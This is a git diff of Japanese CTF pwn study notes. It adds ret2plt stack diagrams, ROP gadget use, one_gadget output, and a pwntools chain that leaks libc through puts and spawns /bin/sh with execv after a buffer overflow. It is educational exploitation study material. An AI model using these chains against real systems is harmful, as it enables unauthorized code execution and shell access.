@@ -154,7 +154,8 @@ main関数を逆アセンブル
 メモリ内の大体を表示   
 - `pattc 200`      
 - `patto AAAJ`   
-
+- `dumprop`   
+ropに使える、直後にretの存在する命令を探す   
 #### gdb-pwndbg
 - `gdb-pendbg ./file`   
 - `heap`   
@@ -248,8 +249,6 @@ RIP = ret命令のアドレス  RIP = 0x4007f0                 RIP = win関数�
 |         |             |         |                    |         |
 (High)
 ```
-### gadget
-
 ### ret2plt
 `printf@plt`とかをリターンアドレスをにセットすると、動的リンクされたライブラリのアドレスを解決してライブラリ内の関数(printf)を実行してくれる。   
 libc_printfを知っている必要がない！   
@@ -257,7 +256,33 @@ system関数はpltにはない。printf@pltをよく使う？
 `objdump  -d -M intel -j .plt  chall`   
 でpltの一覧を取得。   
 pltのアドレスは実行ファイル内のアドレスなので有効(ASLR関係ない)。
+```txt
+# x86
+    ret前
+|           |
+|   100h    |
+| saved_ebp | __ esp
+| ret_addr  | <- printf@plt
+|   arg1    | <- 0x42424242 (printf呼び出し後の偽のリターンアドレス)
+|   arg2    | <- buffer変数のアドレス
+|   ....    |
+|           | __ ebp
+|           |
 
+# x86-64
+    ret前
+|           |
+|   100h    |
+| saved_rbp | __ rsp
+| ret_addr  | <- pop rdi;retへのアドレス
+|   arg1    | <- rdiに入れたいGOT printfのアドレス (libc_printfが書き込まれている)
+|   arg2    | <- puts@plt
+|           | <- addr_main (puts関数のリターンアドレス)
+|   ....    |
+|           | __ rbp
+|           |
+
+```
 ### ret2libc
 動的リンクされたライブラリのアドレスをリターンアドレスにセットして、呼び出す。   
 ASLRによって動的リンクされたライブラリはランダム化されるため、libc leakが前提条件。   
@@ -309,6 +334,27 @@ exitは一度もまだ呼ばれていないのでexitのGOTにはexit@pltのア�
   4006d6:	68 07 00 00 00       	push   0x7
   4006db:	e9 70 ff ff ff       	jmp    400650 <.plt>   <- 2回目以降はこの処理は入らない
 
+```
+### gadget
+x86-64の場合は、引数はrdi引数から始まるため、スタックにしか書き込めない場合は`pop rdi;ret`によってRDIレジスタに引数にしたい値を書き込むことになる。
+#### one-gadget RCE
+libcに存在する、そこに実行を移すだけで`/bin/sh`が起動するガジェット。   
+それぞれ制約があるが、それほど気にせずに全部試してダメだったら対応すればいいらしい。   
+```txt
+takabaya-shi@takabayashi-VirtualBox:~/$ one_gadget libc-2.27.so 
+0x4f2c5 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  rsp & 0xf == 0
+  rcx == NULL
+
+0x4f322 execve("/bin/sh", rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve("/bin/sh", rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL
+takabaya-shi@takabayashi-VirtualBox:~/$
 ```
 ### format string bug
 以下のようにフォーマットが指定されていない場合に有効。   
@@ -1022,8 +1068,10 @@ gdb-peda$ x/32gx 0x555555757a60
 - setbufなどの別の関数のGOTをprintf@pltに書き換えてsetbufをcallしてprintfを呼び出す   
 printf(leakしたいアドレス)としたいので、書き換えるGOTは引数を伴うものがよい。  
 printf@pltのアドレスは固定。   
-- printf@plt(ランダム化されない)をリターンアドレスにセット   
-- すでに一度呼ばれた関数のGOTの下位バイトを書き換えてlibcの関数を呼びだす   
+- printf@plt(ランダム化されない)をリターンアドレスにセット(x86)   
+すでに一度呼ばれた関数のGOTにはlibcのアドレスが書かれているので、引数にはGOT_addrをセットしてlibc leak   
+- `pop rdi;ret`をリターンアドレスにセットしてROP gadget (x86-64)   
+- すでに一度呼ばれた関数のGOTの下位バイトを書き換えて別のlibcの関数を呼びだす   
 
 ##### 起動時の動作
 ```txt
@@ -1051,6 +1099,7 @@ libc_base        = libc_start_main - offset_libc_start_main
 addr_libc_system    = libc_base + offset_libc_system
 addr_libc_str_sh (/bin/sh)   = libc_base + offset_libc_str_sh
 addr_libc_free_hook    = libc_base + offset_libc_free_hook
+libc_gadget = libc_base + 0x4f2c5
 
 (low)
 |               |
@@ -1160,8 +1209,9 @@ libc_start_main = conn.recvline() #改行まで読み込み
 conn.recvuntil('\n')
 
 printf = conn.recv(6)      # 6を指定しないと余計なものまで読み込んでしまう
-print("recv:" + printf)                  # recv:\x80\x8e\xa4��
+print("recv:" + printf)                  # recv:\x80\x8e\xa4�� (\x80\x8e\xa4\xf7\xff\x7f)
 libc_printf = u64(printf.ljust(8,b'\0')) # libc_printf:0x7ffff7a48e80
+                                         # u64(\x80\x8e\xa4\xf7\xff\x7f\x00\x00)
 
 conn.interactive()
 ```
@@ -1178,8 +1228,38 @@ hex(elf.plt["printf"]) #0x400590
 libc.symbols["__libc_start_main"] #137904
 offset_libc_printf = libc.symbols["printf"] #137904
 
-
 info('addr_libc_base    = 0x{:08x}'.format(libc_base))
+```
+###### Rop Chain
+```txt
+# puts(GOT_printf)でlibc leak
+
+elf = ELF("./file")
+rop = ROP(elf)
+rop.puts(elf.got.printf)
+rop.main()
+print(rop.dump())
+# 0x0000:         0x400873 pop rdi; ret             # return_addr
+# 0x0008:         0x601020 [arg0] rdi = got.printf  # すでに一度呼ばれたprintf関数のGOT_addr
+# 0x0010:         0x4005d0 puts                     # puts@plt
+# 0x0018:         0x400782 main()                   # main関数の最初
+conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
+
+# system("/bin/sh")呼び出し
+
+libc.address = libc_printf - libc.symbols.printf
+
+rop = ROP(libc)
+# rop.system(next(libc.search(b'/bin/sh'))) # スタックアラインメントの問題がある場合がある
+# rop.raw(0x400874)                         # retでrspを8バイトずらす
+rop.execv(next(libc.search(b'/bin/sh')),0 ) # systemがダメな時はexecv()を使う
+print(rop.dump())
+# 0x0000:   0x7ffff7a07e6a pop rsi; ret
+# 0x0008:              0x0 [arg1] rsi = 0
+# 0x0010:   0x7ffff7a0555f pop rdi; ret
+# 0x0018:   0x7ffff7b97e9a [arg0] rdi = 140737349516954
+# 0x0020:   0x7ffff7ac8fa0 execv
+conn.sendlineafter("ID: ", "A"*40 + rop.chain() )
 ```
 ##### alarmのbypass
 `hexedit`でバイナリを書き換える。   
